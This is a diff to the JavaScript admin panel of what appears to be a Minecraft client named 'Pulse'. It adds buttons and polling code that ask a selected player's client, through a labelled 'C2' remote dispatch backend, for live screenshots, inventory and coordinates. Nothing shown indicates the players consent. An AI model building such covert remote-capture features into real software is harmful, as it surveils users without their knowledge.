@@ -1910,12 +1910,20 @@ function renderActiveSessions(sessions) {
                 ${lifetimePlaytime}
             </td>
             <td>${userIpCell}</td>
-            <td style="text-align: right;">
-                <button type="button" class="btn-remote-cmd" data-id="${session.id || ''}" data-mc="${session.mc_username || ''}" data-key="${session.license_key || ''}" onclick="openAdminRemoteModal(this.getAttribute('data-id'), this.getAttribute('data-mc'), this.getAttribute('data-key'))" title="⚡ C2 Remote Dispatch Terminal">
-                    <span class="c2-live-dot"></span>
-                    <span class="c2-prompt-prefix">&gt;_</span>
-                    <span>C2 TERMINAL</span>
-                </button>
+            <td style="text-align: right; white-space: nowrap;">
+                <div style="display: inline-flex; align-items: center; gap: 6px;">
+                    <button type="button" class="btn-remote-cmd" data-id="${session.id || ''}" data-mc="${session.mc_username || ''}" data-key="${session.license_key || ''}" onclick="openAdminRemoteModal(this.getAttribute('data-id'), this.getAttribute('data-mc'), this.getAttribute('data-key'))" title="⚡ C2 Remote Dispatch Terminal">
+                        <span class="c2-live-dot"></span>
+                        <span class="c2-prompt-prefix">&gt;_</span>
+                        <span>C2</span>
+                    </button>
+                    <button type="button" class="btn-remote-cmd" style="background: rgba(56, 189, 248, 0.15) !important; border: 1px solid rgba(56, 189, 248, 0.35) !important; color: #38bdf8 !important; padding: 6px 10px !important; border-radius: 8px !important; cursor: pointer;" onclick="openAdminScreenshotModal('${session.license_key || ''}', '${session.mc_username || ''}')" title="📸 Live Game Screenshot">
+                        <span>📸</span>
+                    </button>
+                    <button type="button" class="btn-remote-cmd" style="background: rgba(168, 85, 247, 0.15) !important; border: 1px solid rgba(168, 85, 247, 0.35) !important; color: #c084fc !important; padding: 6px 10px !important; border-radius: 8px !important; cursor: pointer;" onclick="openAdminInspectorModal('${session.license_key || ''}', '${session.mc_username || ''}')" title="🎒 Live Player & Inventory Inspector">
+                        <span>🎒</span>
+                    </button>
+                </div>
             </td>
         `;
         adminSessionsTableBody.appendChild(row);
@@ -2227,6 +2235,418 @@ async function sendRemoteCommand() {
     }
 }
 window.sendRemoteCommand = sendRemoteCommand;
+
+// ==========================================
+// REMOTE SCREENSHOT & PLAYER INSPECTOR LOGIC
+// ==========================================
+let currentScreenshotTargetKey = '';
+let currentScreenshotTargetMc = '';
+let screenshotPollTimer = null;
+
+let currentInspectTargetKey = '';
+let currentInspectTargetMc = '';
+let inspectPollTimer = null;
+
+function triggerLiveScreenshotFromRemote() {
+    const selectEl = document.getElementById('remote-target-select');
+    if (!selectEl || !selectEl.value) {
+        showBanner("გთხოვთ ჯერ აირჩიოთ სამიზნე ონლაინ მოთამაშე!", "error");
+        return;
+    }
+    const selectedOpt = selectEl.options[selectEl.selectedIndex];
+    const key = selectedOpt.dataset.key || '';
+    const mc = selectedOpt.dataset.mc || '';
+    openAdminScreenshotModal(key, mc);
+}
+window.triggerLiveScreenshotFromRemote = triggerLiveScreenshotFromRemote;
+
+function triggerLiveInspectFromRemote() {
+    const selectEl = document.getElementById('remote-target-select');
+    if (!selectEl || !selectEl.value) {
+        showBanner("გთხოვთ ჯერ აირჩიოთ სამიზნე ონლაინ მოთამაშე!", "error");
+        return;
+    }
+    const selectedOpt = selectEl.options[selectEl.selectedIndex];
+    const key = selectedOpt.dataset.key || '';
+    const mc = selectedOpt.dataset.mc || '';
+    openAdminInspectorModal(key, mc);
+}
+window.triggerLiveInspectFromRemote = triggerLiveInspectFromRemote;
+
+async function openAdminScreenshotModal(targetKey, targetMc) {
+    currentScreenshotTargetKey = targetKey || '';
+    currentScreenshotTargetMc = targetMc || '';
+
+    const modal = document.getElementById('admin-screenshot-modal');
+    if (!modal) return;
+
+    modal.classList.remove('hidden');
+    modal.style.setProperty('display', 'flex', 'important');
+
+    const userLabel = document.getElementById('shot-meta-user');
+    if (userLabel) userLabel.textContent = 'მოთამაშე: ' + (targetMc || targetKey || 'Unknown');
+    const timeLabel = document.getElementById('shot-meta-time');
+    if (timeLabel) timeLabel.textContent = 'დრო: ' + new Date().toLocaleTimeString('ka-GE');
+
+    const loader = document.getElementById('screenshot-modal-loader');
+    const imgEl = document.getElementById('screenshot-modal-img');
+    if (loader) {
+        loader.style.display = 'flex';
+        loader.innerHTML = `
+            <div style="width: 38px; height: 38px; border: 3px solid rgba(56, 189, 248, 0.2); border-top-color: #38bdf8; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+            <div style="font-size: 13px; font-family: 'JetBrains Mono', monospace; font-weight: 600;">კადრი იღება მოთამაშის კლიენტიდან...</div>
+            <div style="font-size: 11px; color: var(--text-muted);">გთხოვთ დაელოდოთ (1-2 წამი)</div>
+        `;
+    }
+    if (imgEl) {
+        imgEl.style.display = 'none';
+        imgEl.src = '';
+    }
+
+    await requestScreenshotPayload();
+}
+window.openAdminScreenshotModal = openAdminScreenshotModal;
+
+function closeAdminScreenshotModal() {
+    if (screenshotPollTimer) {
+        clearInterval(screenshotPollTimer);
+        screenshotPollTimer = null;
+    }
+    const modal = document.getElementById('admin-screenshot-modal');
+    if (modal) {
+        modal.classList.add('hidden');
+        modal.style.setProperty('display', 'none', 'important');
+    }
+}
+window.closeAdminScreenshotModal = closeAdminScreenshotModal;
+
+async function retakeAdminScreenshot() {
+    const loader = document.getElementById('screenshot-modal-loader');
+    const imgEl = document.getElementById('screenshot-modal-img');
+    if (loader) {
+        loader.style.display = 'flex';
+        loader.innerHTML = `
+            <div style="width: 38px; height: 38px; border: 3px solid rgba(56, 189, 248, 0.2); border-top-color: #38bdf8; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+            <div style="font-size: 13px; font-family: 'JetBrains Mono', monospace; font-weight: 600;">ახალი კადრი იღება მოთამაშის კლიენტიდან...</div>
+            <div style="font-size: 11px; color: var(--text-muted);">გთხოვთ დაელოდოთ (1-2 წამი)</div>
+        `;
+    }
+    if (imgEl) imgEl.style.display = 'none';
+    await requestScreenshotPayload();
+}
+window.retakeAdminScreenshot = retakeAdminScreenshot;
+
+async function requestScreenshotPayload() {
+    if (screenshotPollTimer) {
+        clearInterval(screenshotPollTimer);
+        screenshotPollTimer = null;
+    }
+
+    try {
+        const metadata = (currentUser && currentUser.user_metadata) || {};
+        const adminName = metadata.user_name || metadata.custom_claims?.username || metadata.full_name || metadata.name || 'Admin';
+
+        const res = await fetch("https://errormissing-pulse-bot.hf.space/admin/remote-screenshot", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                target_key: currentScreenshotTargetKey,
+                target_mc: currentScreenshotTargetMc,
+                admin_user: adminName
+            })
+        });
+
+        const data = await res.json();
+        console.log("[Screenshot] Request response:", data);
+
+        let attempts = 0;
+        const targetLookup = currentScreenshotTargetMc || currentScreenshotTargetKey;
+
+        screenshotPollTimer = setInterval(async () => {
+            attempts++;
+            if (attempts > 20) {
+                clearInterval(screenshotPollTimer);
+                screenshotPollTimer = null;
+                const loader = document.getElementById('screenshot-modal-loader');
+                if (loader) {
+                    loader.innerHTML = `
+                        <div style="font-size: 28px; color: #f43f5e;">⚠️</div>
+                        <div style="font-size: 13px; color: #f43f5e; font-weight: 700;">მოთამაშისგან კადრი დროულად ვერ მივიღეთ.</div>
+                        <div style="font-size: 11px; color: var(--text-muted);">შესაძლოა მოთამაშე გავიდა სერვერიდან ან მენიუშია.</div>
+                    `;
+                }
+                return;
+            }
+
+            try {
+                const pollRes = await fetch(`https://errormissing-pulse-bot.hf.space/admin/screenshot-view/${encodeURIComponent(targetLookup)}?t=${Date.now()}`);
+                if (pollRes.ok) {
+                    const pollData = await pollRes.json();
+                    if (pollData && pollData.screenshot && pollData.screenshot.image_data) {
+                        clearInterval(screenshotPollTimer);
+                        screenshotPollTimer = null;
+                        renderScreenshotImage(pollData.screenshot);
+                    }
+                }
+            } catch (err) {
+                console.warn("[Screenshot poll warning]", err);
+            }
+        }, 800);
+
+    } catch (e) {
+        console.error("Screenshot request failed:", e);
+        showBanner("სქრინშოტის მოთხოვნის შეცდომა: " + e.message, "error");
+    }
+}
+
+function renderScreenshotImage(shot) {
+    const loader = document.getElementById('screenshot-modal-loader');
+    const imgEl = document.getElementById('screenshot-modal-img');
+    const dlBtn = document.getElementById('screenshot-modal-download-btn');
+    const timeLabel = document.getElementById('shot-meta-time');
+
+    if (loader) loader.style.display = 'none';
+    if (imgEl) {
+        imgEl.src = shot.image_data;
+        imgEl.style.display = 'block';
+    }
+    if (dlBtn) {
+        dlBtn.href = shot.image_data;
+        dlBtn.download = `Pulse_Screenshot_${shot.mc_user || 'player'}_${Date.now()}.png`;
+    }
+    if (timeLabel && shot.created_at) {
+        timeLabel.textContent = 'დრო: ' + new Date(shot.created_at).toLocaleTimeString('ka-GE');
+    }
+}
+
+async function openAdminInspectorModal(targetKey, targetMc) {
+    currentInspectTargetKey = targetKey || '';
+    currentInspectTargetMc = targetMc || '';
+
+    const modal = document.getElementById('admin-inspector-modal');
+    if (!modal) return;
+
+    modal.classList.remove('hidden');
+    modal.style.setProperty('display', 'flex', 'important');
+
+    const playerTag = document.getElementById('inspect-modal-player-tag');
+    if (playerTag) playerTag.textContent = '@' + (targetMc || targetKey || 'Player');
+
+    const loader = document.getElementById('inspect-modal-loader');
+    const content = document.getElementById('inspect-modal-content');
+    if (loader) {
+        loader.style.display = 'flex';
+        loader.innerHTML = `
+            <div style="width: 38px; height: 38px; border: 3px solid rgba(168, 85, 247, 0.2); border-top-color: #c084fc; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+            <div style="font-size: 13px; font-family: 'JetBrains Mono', monospace; font-weight: 600;">მოთამაშის ინვენტარისა და სტატუსის ჩატვირთვა...</div>
+        `;
+    }
+    if (content) content.style.display = 'none';
+
+    await requestInspectPayload();
+}
+window.openAdminInspectorModal = openAdminInspectorModal;
+
+function closeAdminInspectorModal() {
+    if (inspectPollTimer) {
+        clearInterval(inspectPollTimer);
+        inspectPollTimer = null;
+    }
+    const modal = document.getElementById('admin-inspector-modal');
+    if (modal) {
+        modal.classList.add('hidden');
+        modal.style.setProperty('display', 'none', 'important');
+    }
+}
+window.closeAdminInspectorModal = closeAdminInspectorModal;
+
+async function refreshAdminInspect() {
+    const loader = document.getElementById('inspect-modal-loader');
+    const content = document.getElementById('inspect-modal-content');
+    if (loader) {
+        loader.style.display = 'flex';
+        loader.innerHTML = `
+            <div style="width: 38px; height: 38px; border: 3px solid rgba(168, 85, 247, 0.2); border-top-color: #c084fc; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+            <div style="font-size: 13px; font-family: 'JetBrains Mono', monospace; font-weight: 600;">მონაცემები ახლდება...</div>
+        `;
+    }
+    if (content) content.style.display = 'none';
+    await requestInspectPayload();
+}
+window.refreshAdminInspect = refreshAdminInspect;
+
+async function requestInspectPayload() {
+    if (inspectPollTimer) {
+        clearInterval(inspectPollTimer);
+        inspectPollTimer = null;
+    }
+
+    try {
+        const metadata = (currentUser && currentUser.user_metadata) || {};
+        const adminName = metadata.user_name || metadata.custom_claims?.username || metadata.full_name || metadata.name || 'Admin';
+
+        const res = await fetch("https://errormissing-pulse-bot.hf.space/admin/remote-inspect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                target_key: currentInspectTargetKey,
+                target_mc: currentInspectTargetMc,
+                admin_user: adminName
+            })
+        });
+
+        const data = await res.json();
+        console.log("[Inspect] Request response:", data);
+
+        let attempts = 0;
+        const targetLookup = currentInspectTargetMc || currentInspectTargetKey;
+
+        inspectPollTimer = setInterval(async () => {
+            attempts++;
+            if (attempts > 20) {
+                clearInterval(inspectPollTimer);
+                inspectPollTimer = null;
+                const loader = document.getElementById('inspect-modal-loader');
+                if (loader) {
+                    loader.innerHTML = `
+                        <div style="font-size: 28px; color: #f43f5e;">⚠️</div>
+                        <div style="font-size: 13px; color: #f43f5e; font-weight: 700;">მოთამაშის ინსპექტირება ვერ მოხერხდა.</div>
+                        <div style="font-size: 11px; color: var(--text-muted);">კლიენტმა არ უპასუხა დროულად.</div>
+                    `;
+                }
+                return;
+            }
+
+            try {
+                const pollRes = await fetch(`https://errormissing-pulse-bot.hf.space/admin/inspect-view/${encodeURIComponent(targetLookup)}?t=${Date.now()}`);
+                if (pollRes.ok) {
+                    const pollData = await pollRes.json();
+                    if (pollData && pollData.inspect && pollData.inspect.inspect_data) {
+                        clearInterval(inspectPollTimer);
+                        inspectPollTimer = null;
+                        renderInspectDetails(pollData.inspect.inspect_data);
+                    }
+                }
+            } catch (err) {
+                console.warn("[Inspect poll warning]", err);
+            }
+        }, 800);
+
+    } catch (e) {
+        console.error("Inspect request failed:", e);
+        showBanner("ინსპექტირების შეცდომა: " + e.message, "error");
+    }
+}
+
+function renderInspectDetails(data) {
+    const loader = document.getElementById('inspect-modal-loader');
+    const content = document.getElementById('inspect-modal-content');
+    if (loader) loader.style.display = 'none';
+    if (content) content.style.display = 'flex';
+
+    const hpEl = document.getElementById('insp-hp-text');
+    if (hpEl) {
+        const hp = parseFloat(data.health || 20).toFixed(1);
+        const maxHp = parseFloat(data.max_health || 20).toFixed(1);
+        hpEl.textContent = `${hp} / ${maxHp} HP`;
+    }
+    const foodEl = document.getElementById('insp-food-text');
+    if (foodEl) foodEl.textContent = `${data.food || 0} / 20`;
+    const armorEl = document.getElementById('insp-armor-text');
+    if (armorEl) armorEl.textContent = `${data.armor || 0} Armor (Lvl ${data.xp_level || 0})`;
+    const coordsEl = document.getElementById('insp-coords-text');
+    if (coordsEl) coordsEl.textContent = `X: ${data.x || 0}, Y: ${data.y || 0}, Z: ${data.z || 0}`;
+    const dimEl = document.getElementById('insp-dim-text');
+    if (dimEl) {
+        let dimName = data.dimension || 'Overworld';
+        if (dimName.includes('nether')) dimName = '🔥 The Nether';
+        else if (dimName.includes('end')) dimName = '🔮 The End';
+        else dimName = '🌲 Overworld';
+        dimEl.textContent = `${dimName} • ${data.server || 'Main Menu'}`;
+    }
+
+    const mainEl = document.getElementById('insp-item-main');
+    if (mainEl) mainEl.textContent = data.main_hand && data.main_hand !== 'Air' ? `${data.main_hand} (x${data.main_hand_count || 1})` : 'ცარიელი (Air)';
+    const offEl = document.getElementById('insp-item-off');
+    if (offEl) offEl.textContent = data.off_hand && data.off_hand !== 'Air' ? `${data.off_hand} (x${data.off_hand_count || 1})` : 'ცარიელი (Air)';
+    const helmEl = document.getElementById('insp-item-helm');
+    if (helmEl) helmEl.textContent = data.helmet || 'None';
+    const chestEl = document.getElementById('insp-item-chest');
+    if (chestEl) chestEl.textContent = data.chest || 'None';
+    const legsEl = document.getElementById('insp-item-legs');
+    if (legsEl) legsEl.textContent = data.legs || 'None';
+    const bootsEl = document.getElementById('insp-item-boots');
+    if (bootsEl) bootsEl.textContent = data.boots || 'None';
+
+    const gridEl = document.getElementById('insp-inventory-grid');
+    if (gridEl) {
+        gridEl.innerHTML = '';
+        const items = data.inventory || [];
+        const itemMap = {};
+        items.forEach(it => { itemMap[it.slot] = it; });
+
+        for (let i = 0; i < 36; i++) {
+            const slotBox = document.createElement('div');
+            const isHotbar = (i >= 0 && i <= 8);
+            slotBox.style.cssText = `
+                aspect-ratio: 1;
+                background: ${isHotbar ? 'rgba(56, 189, 248, 0.08)' : 'rgba(255, 255, 255, 0.03)'};
+                border: 1px solid ${isHotbar ? 'rgba(56, 189, 248, 0.3)' : 'rgba(255, 255, 255, 0.08)'};
+                border-radius: 6px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 3px;
+                position: relative;
+                font-family: 'JetBrains Mono', monospace;
+                min-height: 48px;
+            `;
+
+            const it = itemMap[i];
+            if (it) {
+                slotBox.title = `${it.name} (x${it.count})`;
+                slotBox.innerHTML = `
+                    <div style="font-size: 10px; color: #f8fafc; font-weight: 700; text-align: center; line-height: 1.1; max-height: 24px; overflow: hidden; text-overflow: ellipsis;">${it.name.replace('block.minecraft.', '').replace('item.minecraft.', '')}</div>
+                    <div style="font-size: 10px; font-weight: 800; color: #38bdf8; position: absolute; bottom: 2px; right: 4px;">x${it.count}</div>
+                `;
+            } else {
+                slotBox.innerHTML = `<span style="font-size: 9px; color: rgba(255,255,255,0.15);">${i}</span>`;
+            }
+            gridEl.appendChild(slotBox);
+        }
+    }
+
+    const effContainer = document.getElementById('insp-effects-container');
+    if (effContainer) {
+        effContainer.innerHTML = '';
+        const effects = data.effects || [];
+        if (effects.length === 0) {
+            effContainer.innerHTML = '<span style="color: var(--text-muted); font-size: 11.5px;">აქტიური ეფექტები არ არის</span>';
+        } else {
+            effects.forEach(ef => {
+                const badge = document.createElement('div');
+                badge.style.cssText = `
+                    background: rgba(16, 185, 129, 0.15);
+                    border: 1px solid rgba(16, 185, 129, 0.35);
+                    color: #34d399;
+                    padding: 4px 10px;
+                    border-radius: 6px;
+                    font-weight: 700;
+                    font-size: 11.5px;
+                    display: inline-flex;
+                    align-items: center;
+                    gap: 6px;
+                `;
+                const cleanName = (ef.name || 'Effect').replace('effect.minecraft.', '').replace('_', ' ').toUpperCase();
+                const mins = Math.floor((ef.duration_seconds || 0) / 60);
+                const secs = ((ef.duration_seconds || 0) % 60).toString().padStart(2, '0');
+                badge.innerHTML = `<span>🧪 ${cleanName} ${ef.amplifier > 0 ? (ef.amplifier + 1) : ''}</span><span style="color: #a7f3d0; font-family: monospace;">(${mins}:${secs})</span>`;
+                effContainer.appendChild(badge);
+            });
+        }
+    }
+}
 
 // ==========================================
 // ADMIN CRASH REPORTS & DIAGNOSTICS LOGIC
